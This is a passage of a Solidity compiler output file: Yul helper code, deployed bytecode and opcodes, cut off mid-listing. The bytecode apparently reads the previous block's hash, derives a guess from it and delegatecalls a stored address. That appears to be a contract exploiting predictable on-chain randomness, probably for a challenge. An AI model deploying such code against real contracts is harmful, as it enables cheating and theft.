														"type": ""
													}
												],
												"src": "1352:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1638:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1649:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1665:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "1659:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1659:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "1649:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1621:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1631:6:1",
														"type": ""
													}
												],
												"src": "1580:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1797:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1807:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1822:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "1807:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1769:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "1774:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "1785:11:1",
														"type": ""
													}
												],
												"src": "1684:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1879:143:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1889:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "1912:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1894:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1894:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "1889:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1923:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1946:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1928:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1928:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "1923:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1970:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "1972:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1972:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1972:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "1967:1:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1960:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1960:9:1"
															},
															"nodeType": "YulIf",
															"src": "1957:35:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2002:14:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2011:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2014:1:1"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "2007:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2007:9:1"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "2002:1:1"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "1868:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "1871:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "1877:1:1",
														"type": ""
													}
												],
												"src": "1837:185:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2073:146:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2083:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2106:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2088:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2088:20:1"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2083:1:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2117:25:1",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2140:1:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2122:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2122:20:1"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2117:1:1"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2164:22:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2166:16:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2166:18:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2166:18:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2158:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2161:1:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2155:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2155:8:1"
															},
															"nodeType": "YulIf",
															"src": "2152:34:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2196:17:1",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2208:1:1"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2211:1:1"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2204:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2204:9:1"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "2196:4:1"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2059:1:1",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2062:1:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "2068:4:1",
														"type": ""
													}
												],
												"src": "2028:191:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2267:48:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2277:32:1",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2302:5:1"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nodeType": "YulIdentifier",
																			"src": "2295:6:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2295:13:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2288:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2288:21:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2277:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2249:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2259:7:1",
														"type": ""
													}
												],
												"src": "2225:90:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2366:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2376:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "2387:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2376:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bytes32",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2348:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2358:7:1",
														"type": ""
													}
												],
												"src": "2321:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2449:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2459:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "2470:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "2459:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2431:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "2441:7:1",
														"type": ""
													}
												],
												"src": "2404:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2536:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "2546:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "2555:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "2550:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2615:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "2640:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "2645:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "2636:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2636:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "2659:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "2664:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "2655:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "2655:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "2649:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2649:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2629:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2629:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2629:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "2576:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "2579:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2573:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2573:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "2587:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "2589:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "2598:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2601:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "2594:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2594:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "2589:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "2569:3:1",
																"statements": []
															},
															"src": "2565:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2712:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "2762:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "2767:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "2758:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "2758:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2776:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "2751:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2751:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2751:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "2693:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "2696:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "2690:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2690:13:1"
															},
															"nodeType": "YulIf",
															"src": "2687:101:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "2518:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "2523:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2528:6:1",
														"type": ""
													}
												],
												"src": "2487:307:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2828:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2845:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2848:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2838:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2838:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2838:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2942:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2945:4:1",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2935:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2935:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2935:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2966:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2969:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2959:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2959:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2959:15:1"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "2800:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3014:152:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3031:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3034:77:1",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3024:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3024:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3024:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3128:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3131:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3121:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3121:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3121:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3152:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3155:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "3145:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3145:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3145:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2986:180:1"
											}
										]
									},
									"contents": "{\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_bytes32_to_t_bytes32_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bytes32(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_bytes32_t_bool__to_t_bytes32_t_bool__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_bytes32_to_t_bytes32_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_bool_to_t_bool_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_bytes32(value) -> cleaned {\n        cleaned := value\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063890d690814610030575b600080fd5b61003861004e565b60405161004591906102b9565b60405180910390f35b60008060008054600143610062919061031b565b4060001c61007091906102ea565b119050801561014a57600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d60016040516020016100e6929190610290565b6040516020818303038152906040526040516101029190610279565b600060405180830381855af49150503d806000811461013d576040519150601f19603f3d011682016040523d82523d6000602084013e610142565b606091505b505050610217565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167f1d263f678198afcb61494c86d0b849d04a869f89e604450ae1a549aa6619dd3d60006040516020016101b7929190610290565b6040516020818303038152906040526040516101d39190610279565b600060405180830381855af49150503d806000811461020e576040519150601f19603f3d011682016040523d82523d6000602084013e610213565b606091505b5050505b5090565b6102248161034f565b82525050565b6102338161035b565b82525050565b6000610244826102d4565b61024e81856102df565b935061025e81856020860161036f565b80840191505092915050565b61027381610365565b82525050565b60006102858284610239565b915081905092915050565b60006040820190506102a5600083018561022a565b6102b2602083018461021b565b9392505050565b60006020820190506102ce600083018461026a565b92915050565b600081519050919050565b600081905092915050565b60006102f582610365565b915061030083610365565b9250826103105761030f6103d1565b5b828204905092915050565b600061032682610365565b915061033183610365565b925082821015610344576103436103a2565b5b828203905092915050565b60008115159050919050565b6000819050919050565b6000819050919050565b60005b8381101561038d578082015181840152602081019050610372565b8381111561039c576000848401525b50505050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fdfea2646970667358221220763bcdd29619cd8c50ca8eb1660d4b82a5c8b69b1e33484f8508fefcad3b5c5664736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x890D6908 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x4E JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x2B9 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 NUMBER PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x31B JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR PUSH2 0x70 SWAP2 SWAP1 PUSH2 0x2EA JUMP JUMPDEST GT SWAP1 POP DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D PUSH1 0x1 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xE6 SWAP3 SWAP2 SWAP1 PUSH2 0x290 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x102 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x13D JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x142 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0x217 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x1D263F678198AFCB61494C86D0B849D04A869F89E604450AE1A549AA6619DD3D PUSH1 0x0 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x1B7 SWAP3 SWAP2 SWAP1 PUSH2 0x290 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x1D3 SWAP2 SWAP1 PUSH2 0x279 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x20E JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x213 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0x224 DUP2 PUSH2 0x34F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x233 DUP2 PUSH2 0x35B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x244 DUP3 PUSH2 0x2D4 JUMP JUMPDEST PUSH2 0x24E DUP2 DUP6 PUSH2 0x2DF JUMP JUMPDEST SWAP4 POP PUSH2 0x25E DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x36F JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x273 DUP2 PUSH2 0x365 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x285 DUP3 DUP5 PUSH2 0x239 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x2A5 PUSH1 0x0 